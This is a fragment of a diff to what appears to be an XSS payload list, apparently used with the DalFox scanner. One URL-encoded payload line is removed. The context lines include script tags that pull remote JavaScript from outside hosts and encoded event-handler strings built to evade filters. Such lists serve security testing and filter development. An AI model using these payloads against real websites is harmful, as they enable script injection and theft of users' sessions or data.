@@ -76,7 +76,6 @@ DalFox
 <script src=//brutelogic.com.br/1.js> 
 <script src=//3334957647/1>
 %3Cx onxxx=alert(1) 
-<%78 onxxx=1 
 <x %6Fnxxx=1 
 <x o%6Exxx=1 
 <x on%78xx=1 
